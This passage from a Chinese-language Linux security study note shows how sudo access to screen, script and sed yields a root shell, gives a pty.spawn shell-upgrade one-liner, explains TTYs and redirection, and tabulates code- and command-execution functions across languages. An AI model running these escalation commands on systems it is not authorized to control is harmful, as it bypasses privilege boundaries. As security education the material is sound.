<li><strong>SSH 断开不中断进程</strong>：远程执行耗时任务（如数据备份、脚本运行）时，若 SSH 连接断开，普通终端进程会被终止；<code>screen</code> 会话内的进程不受影响。</li>
<li><strong>多会话复用终端</strong>：在一个物理终端中创建多个虚拟终端会话，无需开启多个 SSH 窗口，切换灵活。<strong>(主要，同tmax)</strong></li>
<li><strong>会话恢复</strong>：重新登录服务器后，可恢复之前的 <code>screen</code> 会话，继续操作未完成的任务。</li>
</ol>
<p><strong><code>sudo screen</code></strong> <code>sudo</code>直接启动就能启动root权限的新bash会话</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209151159798.png?lastModify=1766751620" alt="image-20251209151159798"></p>
<p><strong>提示</strong><strong>”按空格或回车结束“</strong> 按完之后即可获得root shell   <img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209151437440.png?lastModify=1766751620" alt="image-20251209151437440"></p>
<h2 id="sudo-script"><a href="#sudo-script" class="headerlink" title="sudo script"></a>sudo script</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209151555902.png?lastModify=1766751620" alt="image-20251209151555902"></p>
<p><code>script</code>本来就是启动新的shell会话，然后记录所有的会话命令。直接<code>sudo script</code>即可获得root shell</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209152010660.png?lastModify=1766751620" alt="image-20251209152010660"></p>
<p><strong>但是它多提示了一个script程序的banner头和尾，而且我们也****不希望它记录会话命令</strong></p>
<ul>
<li><code>-q</code>是<code>quiet</code>静默，不显示banner的头和尾</li>
<li><code>/dev/null</code>丢掉script的记录结果</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209152154741.png?lastModify=1766751620" alt="image-20251209152154741"></p>
<h2 id="sudo-sed"><a href="#sudo-sed" class="headerlink" title="sudo sed"></a>sudo sed</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209152227312.png?lastModify=1766751620" alt="image-20251209152227312"></p>
<p><code>sed</code>（Stream Editor，流编辑器）是 Linux&#x2F;Unix 系统中核心的<strong>非交互式文本处理工具</strong>，它以 “流” 的方式逐行读取文本输入（文件 &#x2F; 管道数据），按预设规则对行内容进行替换、删除、新增、提取等操作，处理后输出结果（默认不修改原文件），是批量编辑文本、日志分析、脚本自动化的必备工具。**	**<strong>用于文本读取和编辑</strong></p>
<p><strong>sed默认会打印每一行内容，而</strong><code>-n</code>参数只会打印你指定的那些行</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209152620434.png?lastModify=1766751620" alt="image-20251209152620434"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7557" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">sed</span> <span class="cm-attribute">-n</span> <span class="cm-string">'1e exec bash 1>&0'</span> /etc/hosts（后面的文件可以随意指定）</span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><strong><code>-n</code></strong></th>
<th><strong><code>sed</code>的静默模式：抑制默认的逐行输出，仅执行指定操作（避免干扰命令执行）；</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>1e exec bash 1&gt;&amp;0</code></strong></td>
<td><strong><code>sed</code>的核心处理规则：<code>1</code>：地址定位，指定仅处理第 1 行；<code>e</code>：<code>sed</code>的扩展命令，作用是 “执行当前匹配行的内容作为系统命令”，但此处变种用法是 “直接执行<code>e</code>后跟随的命令”；-<code>exec bash</code>：替换当前<code>sed</code>进程为<code>bash</code>（<code>exec</code>无返回，彻底接管进程）；<code>1&gt;&amp;0</code>：将标准输出（1）重定向到标准输入（0），确保<code>bash</code>保持交互式（避免 Shell 卡死）；</strong></td>
</tr>
<tr>
<td><strong><code>/etc/hosts</code></strong></td>
<td><strong>任意存在的文件（仅作为<code>sed</code>的 “输入文件” 占位符），<code>sed</code>读取该文件但实际未处理其内容，仅利用 “读取文件” 的语法触发<code>e</code>命令执行。</strong></td>
</tr>
</tbody></table>
<h2 id="sudo-service"><a href="#sudo-service" class="headerlink" title="sudo service"></a>sudo service</h2><p><strong>Linux 系统中 <strong><code>/bin</code> 和 <code>/sbin</code> 是核心的系统命令目录，二者均存放可执行二进制文件，但</strong>面向的用户群体、命令用途、权限等级</strong>有明确区分，核心差异可总结为：<code>/bin</code> 是 “普通用户必备命令”，<code>/sbin</code> 是 “系统管理员（root）的系统管理命令”。</p>
<table>
<thead>
<tr>
<th><strong>维度</strong></th>
<th><code>/bin</code></th>
<th><code>/sbin</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong>目标用户</strong></td>
<td><strong>所有用户（普通用户 + root）</strong></td>
<td><strong>主要为 root &#x2F; 系统管理员（普通用户需 sudo 执行）</strong></td>
</tr>
<tr>
<td><strong>命令用途</strong></td>
<td><strong>基础交互 &#x2F; 日常操作命令（通用）</strong></td>
<td><strong>系统管理 &#x2F; 维护 &#x2F; 配置命令（专用）</strong></td>
</tr>
<tr>
<td><strong>权限要求</strong></td>
<td><strong>普通用户可直接执行</strong></td>
<td><strong>多数需 root 权限（普通用户执行提示权限不足）</strong></td>
</tr>
<tr>
<td><strong>典型命令</strong></td>
<td><strong>ls、cp、mv、cat、bash、rm、echo</strong></td>
<td><strong>ifconfig、reboot、fdisk、fsck、init、iptables</strong></td>
</tr>
<tr>
<td><strong>存在位置</strong></td>
<td><strong>所有 Linux 发行版默认存在</strong></td>
<td><strong>所有 Linux 发行版默认存在</strong></td>
</tr>
<tr>
<td><strong>PATH 环境变量</strong></td>
<td><strong>普通用户的 PATH 包含</strong><code>/bin</code></td>
<td><strong>普通用户的 PATH 通常****不包含</strong> <code>/sbin</code>（root 的 PATH 包含）</td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209153326340.png?lastModify=1766751620" alt="image-20251209153326340"></p>
<p><code>service</code> 是 Linux 系统中<strong>管理系统服务的便捷命令行工具</strong>（主要用于传统 SysVinit 启动体系，CentOS 6 &#x2F; 老版本 Ubuntu 为主），核心作用是 “统一接口启停 &#x2F; 重启 &#x2F; 查看系统服务”，无需记住服务脚本的具体路径和复杂参数，是简化服务管理的 “封装工具”。</p>
<h1 id="什么是TTY"><a href="#什么是TTY" class="headerlink" title="什么是TTY"></a>什么是TTY</h1><p><strong>在 Linux&#x2F;Unix 系统中，*<em><strong>TTY（Teletypewriter 的缩写，意为电传打字机）</strong> 是对</em>*终端设备</strong>的抽象，本质上是用户与系统内核交互的接口 —— 它既是物理输入输出设备（如键盘、显示器）的抽象表示，也是进程与用户交互的 “会话载体”。</p>
<p><strong>简单来说，TTY 就是你操作 Linux 时的 “终端界面”，无论是物理控制台、SSH 远程连接的窗口，还是串口终端，都对应一个 TTY 设备。</strong></p>
<h3 id="一、TTY-的核心概念与分类"><a href="#一、TTY-的核心概念与分类" class="headerlink" title="一、TTY 的核心概念与分类"></a>一、TTY 的核心概念与分类</h3><h4 id="1-物理-TTY（控制台终端）"><a href="#1-物理-TTY（控制台终端）" class="headerlink" title="1. 物理 TTY（控制台终端）"></a>1. 物理 TTY（控制台终端）</h4><p><strong>早期的物理电传打字机（连接到计算机的硬件终端），现代对应服务器的****本地控制台</strong>（如直接接显示器和键盘的界面），通常命名为 <code>/dev/tty1</code>、<code>/dev/tty2</code> 等（Linux 一般有 6 个虚拟控制台，按 <code>Alt+F1~F6</code> 切换）。</p>
<h4 id="2-伪-TTY（PTY，Pseudo-Terminal）"><a href="#2-伪-TTY（PTY，Pseudo-Terminal）" class="headerlink" title="2. 伪 TTY（PTY，Pseudo-Terminal）"></a>2. 伪 TTY（PTY，Pseudo-Terminal）</h4><p><strong>最常见的类型，用于****远程连接或图形界面终端模拟器</strong>（如 SSH、xterm、GNOME Terminal），分为 “主端（PTY master）” 和 “从端（PTY slave）”：</p>
<ul>
<li>**从端（如 **<code>/dev/pts/0</code>、<code>/dev/pts/1</code>）：进程（如 bash）认为自己连接到真实 TTY，负责与用户交互；</li>
<li><strong>主端：由终端模拟器或 SSH 服务管理，转发数据到从端。</strong></li>
</ul>
<h4 id="3-串行-TTY（串口终端）"><a href="#3-串行-TTY（串口终端）" class="headerlink" title="3. 串行 TTY（串口终端）"></a>3. 串行 TTY（串口终端）</h4><p>**通过串口连接的设备（如嵌入式设备、路由器），对应 **<code>/dev/ttyS0</code>、<code>/dev/ttyUSB0</code> 等设备文件。</p>
<h3 id="二、TTY-的作用与意义"><a href="#二、TTY-的作用与意义" class="headerlink" title="二、TTY 的作用与意义"></a>二、TTY 的作用与意义</h3><ol>
<li><strong>用户与内核的交互桥梁</strong>：所有用户输入（如命令）通过 TTY 传递给内核，内核输出（如命令结果）通过 TTY 返回给用户；</li>
<li><strong>进程的会话上下文</strong>：每个 TTY 对应一个会话，进程（如 bash）通过 TTY 确定 “与哪个用户交互”，依赖 TTY 实现交互式操作（如 <code>vim</code>、<code>top</code> 等需要终端的工具）；</li>
<li><strong>权限与归属</strong>：TTY 设备文件有权限控制（如 <code>/dev/pts/0</code> 属主为当前登录用户），确保只有合法用户能操作终端。</li>
</ol>
<h3 id="三、查看-TTY-的常用命令"><a href="#三、查看-TTY-的常用命令" class="headerlink" title="三、查看 TTY 的常用命令"></a>三、查看 TTY 的常用命令</h3><h4 id="1-tty：显示当前终端对应的-TTY-设备路径"><a href="#1-tty：显示当前终端对应的-TTY-设备路径" class="headerlink" title="1. tty：显示当前终端对应的 TTY 设备路径"></a>1. <code>tty</code>：显示当前终端对应的 TTY 设备路径</h4><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7666" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">tty</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 输出示例（SSH 连接）：/dev/pts/0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 输出示例（本地控制台）：/dev/tty1</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<h4 id="2-who-w：查看当前登录用户的-TTY-信息"><a href="#2-who-w：查看当前登录用户的-TTY-信息" class="headerlink" title="2. who&#x2F;w：查看当前登录用户的 TTY 信息"></a>2. <code>who</code>&#x2F;<code>w</code>：查看当前登录用户的 TTY 信息</h4><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7668" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">who</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 输出示例：root     pts/0        2025-12-03 10:00 (192.168.1.100)</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<h4 id="3-ps-aux-grep-tty：查看与-TTY-关联的进程"><a href="#3-ps-aux-grep-tty：查看与-TTY-关联的进程" class="headerlink" title="3. ps aux | grep tty：查看与 TTY 关联的进程"></a>3. <code>ps aux | grep tty</code>：查看与 TTY 关联的进程</h4><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7670" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">ps</span> aux | <span class="cm-builtin">grep</span> <span class="cm-builtin">bash</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 输出示例：root     1234  0.0  0.1  12345  6789 pts/0    Ss   10:00   0:00 bash</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<h3 id="四、TTY-与-Shell-的关系"><a href="#四、TTY-与-Shell-的关系" class="headerlink" title="四、TTY 与 Shell 的关系"></a>四、TTY 与 Shell 的关系</h3><ul>
<li><strong>Shell（如 bash）</strong> 是 “命令解释器”，负责解析用户输入的命令；</li>
<li><strong>TTY</strong> 是 “交互载体”，Shell 必须绑定 TTY 才能实现交互式操作（若 Shell 无 TTY，可能无法使用 <code>su</code>、<code>passwd</code> 等命令）。</li>
</ul>
<p>**例如：通过 **<code>ssh</code> 登录后，SSH 服务会创建一个伪 TTY（<code>/dev/pts/0</code>），并在其上启动 bash，用户的所有操作都通过这个 TTY 与 bash 交互。</p>
<h3 id="五、为什么渗透测试中常关注-TTY？"><a href="#五、为什么渗透测试中常关注-TTY？" class="headerlink" title="五、为什么渗透测试中常关注 TTY？"></a>五、为什么渗透测试中常关注 TTY？</h3><p>**很多漏洞利用获取的 Shell 是 “无 TTY Shell”（如通过管道或套接字），此时部分命令（如 **<code>sudo</code>、<code>vim</code>）会因缺少 TTY 无法执行。攻击者通常会通过 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 或绑定 <code>$(tty)</code> 来创建 TTY Shell，解决交互限制。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p><strong>TTY 是 Linux 系统中用户与内核交互的 “终端接口”，涵盖物理控制台、远程伪终端、串口终端等类型，是实现交互式操作的基础。理解 TTY 有助于解释终端会话、进程交互的本质，也是排查终端问题、渗透测试中加固 Shell 的关键概念。</strong></p>
<h1 id="相关的用法"><a href="#相关的用法" class="headerlink" title="&amp;相关的用法"></a>&amp;相关的用法</h1><h3 id="用于-“引用文件描述符”"><a href="#用于-“引用文件描述符”" class="headerlink" title="&amp; 用于 “引用文件描述符”"></a><strong><code>&amp;</code> 用于 “引用文件描述符”</strong></h3><h4 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h4><p><strong>在 IO 重定向中，</strong><code>&amp;</code> 用于 <strong>引用已存在的文件描述符</strong>（而非普通文件），常见于将输出 &#x2F; 错误重定向到终端、Socket 等设备。</p>
<ul>
<li><code>1</code> 是标准输出（<code>stdout</code>），<code>2</code> 是标准错误（<code>stderr</code>），<code>0</code> 是标准输入（<code>stdin</code>）。</li>
<li><code>&amp;0</code> 表示引用文件描述符 <code>0</code>（标准输入）对应的<strong>终端 &#x2F; 管道 &#x2F; 套接字</strong>。</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ol>
<li><p><strong>重定向到标准输入设备</strong>（对应之前的 <code>1&gt;&amp;0</code>）：</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7696" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 让 Bash 的输出（stdout/stderr）和输入（stdin）用同一个终端</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">bash</span> <span class="cm-number">1</span>>&0 <span class="cm-number">2</span>>&0</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong>这里 <strong><code>&amp;0</code> 表示 “引用文件描述符 0（标准输入）对应的</strong>设备</strong>”（通常是当前终端）。</p>
</li>
<li><p><strong>重定向到文件描述符 1（标准输出）</strong>：</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7700" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 将标准错误（2）重定向到标准输出（1），实现“错误和正常输出都打印到终端”</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">ls</span> non-existent-file <span class="cm-number">2</span>>&1</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p>**若不加 **<code>&amp;</code>，<code>2&gt;1</code> 会被解析为 “将错误输出到名为 <code>1</code> 的文件”，而非引用文件描述符 1。</p>
</li>
<li><p><strong>重定向到已打开的文件</strong>：先打开文件到自定义描述符，再用 <code>&amp;</code> 引用：</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7704" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 打开 log.txt 到描述符 3</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">exec <span class="cm-number">3</span>> log.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 将命令输出重定向到描述符 3 对应的文件</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span> <span class="cm-string">"test log"</span> >&3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 关闭描述符 3</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">exec <span class="cm-number">3</span>>&-</span></pre></div></div></div></div></div><div></div></div></div></pre></li>
</ol>
<h3 id="用于-“后台执行进程”"><a href="#用于-“后台执行进程”" class="headerlink" title="&amp; 用于 “后台执行进程”"></a><code>&amp;</code> 用于 “后台执行进程”</h3><h4 id="意义-1"><a href="#意义-1" class="headerlink" title="意义"></a>意义</h4><p>**在命令末尾加 **<code>&amp;</code>，让进程在 <strong>后台（Background）</strong> 运行，Shell 不会等待进程结束，可继续输入新命令。</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7709" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 启动一个长时间运行的进程（如文件下载），后台执行</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">wget</span> https://example.com/large-file.iso &</span></pre></div></div></div></div></div><div></div></div></div></pre>

<h3 id="用于-“逻辑与”（双-）"><a href="#用于-“逻辑与”（双-）" class="headerlink" title="&amp;&amp; 用于 “逻辑与”（双 &amp;）"></a><code>&amp;&amp;</code> 用于 “逻辑与”（双 <code>&amp;</code>）</h3><p><code>&amp;</code> 和 <code>&amp;&amp;</code>：<code>command &amp; command2</code> 是 “后台执行 command，同时执行 command2”；<code>command &amp;&amp; command2</code> 是 “command 成功才执行 command2”。</p>
<h1 id="代码执行和命令执行"><a href="#代码执行和命令执行" class="headerlink" title="代码执行和命令执行"></a>代码执行和命令执行</h1><p><strong>在常用编程语言中，*<em><strong>代码执行</strong>（动态执行语言代码片段）和</em>*命令执行</strong>（调用操作系统命令 &#x2F; 外部程序）是两类不同的操作，以下是各语言的具体实现方式及特点：</p>
<h3 id="一、代码执行（动态执行语言代码）"><a href="#一、代码执行（动态执行语言代码）" class="headerlink" title="一、代码执行（动态执行语言代码）"></a>一、代码执行（动态执行语言代码）</h3><p>**指在程序运行时动态解析并执行字符串形式的代码片段，属于语言自身的 “内省 &#x2F; 动态执行” 能力，**<strong>仅执行当前语言的代码</strong>。</p>
<table>
<thead>
<tr>
<th><strong>语言</strong></th>
<th><strong>代码执行方式</strong></th>
<th><strong>特点 &#x2F; 注意事项</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Python</strong></td>
<td><strong>-</strong><code>exec(object[, globals[, locals]])</code>：执行多行代码（无返回值）-<code>eval(expression)</code>：执行表达式并返回结果-<code>compile(source, filename, mode)</code>：编译代码后执行</td>
<td><code>exec</code>执行语句，<code>eval</code>仅执行表达式；存在代码注入风险，需严格校验输入</td>
</tr>
<tr>
<td><strong>JavaScript</strong></td>
<td><strong>-</strong><code>eval(code)</code>：执行字符串代码-<code>new Function(...args, body)</code>：动态创建函数并执行- Node.js 中<code>vm</code>模块（更安全的沙箱执行）</td>
<td><code>eval</code>会污染当前作用域，<code>Function</code>作用域独立；<code>vm</code>模块可隔离执行环境</td>
</tr>
<tr>
<td><strong>PHP</strong></td>
<td><strong>-</strong><code>eval(code)</code>：执行字符串形式的 PHP 代码-<code>assert(condition)</code>：条件为字符串时会执行代码（PHP 7.2 后废弃）</td>
<td><strong>仅执行 PHP 代码，需确保代码可信；</strong><code>assert</code>非专用执行函数，高版本已禁用执行功能</td>
</tr>
<tr>
<td><strong>Java</strong></td>
<td><strong>- 通过</strong><code>javax.tools.JavaCompiler</code>编译动态代码，再通过反射加载执行- 使用脚本引擎（如 Nashorn 执行 JS 代码）</td>
<td><strong>Java 本身是静态语言，需借助编译器或脚本引擎；实现复杂，安全性较高</strong></td>
</tr>
<tr>
<td><strong>C#</strong></td>
<td><strong>-</strong><code>CSharpCodeProvider</code>（.NET Framework）或<code>Roslyn</code>编译器（.NET Core+）动态编译并执行代码</td>
<td><strong>需引用编译器库，支持强类型代码执行；适合动态生成程序集</strong></td>
</tr>
<tr>
<td><strong>Ruby</strong></td>
<td><strong>-</strong><code>eval(code)</code>：执行字符串 Ruby 代码-<code>instance_eval</code>&#x2F;<code>class_eval</code>：在对象 &#x2F; 类上下文中执行代码</td>
<td><strong>动态性极强，支持上下文绑定；需注意安全，避免执行不可信代码</strong></td>
</tr>
<tr>
<td><strong>Perl</strong></td>
<td><strong>-</strong><code>eval(code)</code>：执行字符串 Perl 代码（块形式<code>eval { ... }</code>用于异常捕获）</td>
<td><strong>字符串</strong><code>eval</code>执行代码，块<code>eval</code>处理异常；区分使用场景</td>
</tr>
</tbody></table>
<h3 id="二、命令执行（调用操作系统命令-外部程序）"><a href="#二、命令执行（调用操作系统命令-外部程序）" class="headerlink" title="二、命令执行（调用操作系统命令 &#x2F; 外部程序）"></a>二、命令执行（调用操作系统命令 &#x2F; 外部程序）</h3><p>**指调用操作系统的 shell 或可执行文件，**<strong>执行外部命令 &#x2F; 程序</strong>，底层依赖操作系统的 <code>exec</code>&#x2F;<code>fork</code> 等系统调用。</p>
<table>
<thead>
<tr>
<th><strong>语言</strong></th>
<th><strong>命令执行方式</strong></th>
<th><strong>特点 &#x2F; 注意事项</strong></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Python</strong></td>
<td><strong>-</strong><code>subprocess</code>模块（推荐）：<code>subprocess.run()</code>&#x2F;<code>Popen()</code>- 过时方法：<code>os.system()</code>&#x2F;<code>os.popen()</code></td>
<td><code>subprocess</code>功能强大，支持管道、重定向；避免使用<code>os.system</code>（无返回值控制）</td>
<td></td>
</tr>
<tr>
<td><strong>JavaScript</strong></td>
<td><strong>- Node.js 中</strong><code>child_process</code>模块：<code>exec()</code>（通过 shell）&#x2F;<code>execFile()</code>（直接执行文件）<code>spawn()</code>（流式输出）&#x2F;<code>fork()</code>（子进程通信）</td>
<td><code>exec</code>有 shell 注入风险，<code>execFile</code>更安全；<code>spawn</code>适合大输出场景</td>
<td></td>
</tr>
<tr>
<td><strong>PHP</strong></td>
<td><strong>-</strong><code>exec(command[, output])</code>：返回最后一行输出-<code>shell_exec(command)</code>：返回完整输出-<code>system(command)</code>：直接输出结果-<code>passthru(command)</code>：传递二进制输出-<code>proc_open()</code>：双向管道通信</td>
<td><strong>需开启</strong><code>exec</code>权限（php.ini）；避免拼接用户输入，防止命令注入</td>
<td></td>
</tr>
<tr>
<td><strong>Java</strong></td>
<td><strong>-</strong><code>Runtime.getRuntime().exec(command)</code>-<code>ProcessBuilder</code>（更灵活，推荐）</td>
<td><strong>返回</strong><code>Process</code>对象，可控制输入输出；需手动处理流，避免缓冲区阻塞</td>
<td></td>
</tr>
<tr>
<td><strong>C#</strong></td>
<td><strong>-</strong><code>System.Diagnostics.Process</code>类：<code>Process.Start()</code>启动外部程序</td>
<td><strong>支持设置工作目录、重定向输出；可配置是否使用 shell 执行</strong></td>
<td></td>
</tr>
<tr>
<td><strong>Ruby</strong></td>
<td><strong>-</strong><code>system(command)</code>：执行命令，返回布尔值-<code>command</code>（反引号）：返回命令输出-<code>exec(command)</code>：替换当前进程执行命令-<code>Open3.popen3()</code>：双向管道通信</td>
<td><strong>反引号和</strong><code>system</code>常用；<code>exec</code>会终止当前进程，需配合<code>fork</code>使用</td>
<td></td>
</tr>
<tr>
<td><strong>Perl</strong></td>
<td><strong>-</strong><code>system(command)</code>：执行命令，返回退出码-<code>command</code>：返回命令输出-<code>exec(command)</code>：替换进程执行-&#96;open(“</td>
<td>command”,”w&#x2F;r”)&#96;：管道通信</td>
<td><strong>功能丰富，支持管道；注意用户输入过滤，防止注入</strong></td>
</tr>
<tr>
<td><strong>Shell</strong></td>
<td><strong>- 直接执行命令（如</strong><code>ls -l</code>）-<code>exec</code>：替换当前 shell 执行命令-<code>$()</code>&#x2F; 反引号：捕获命令输出</td>
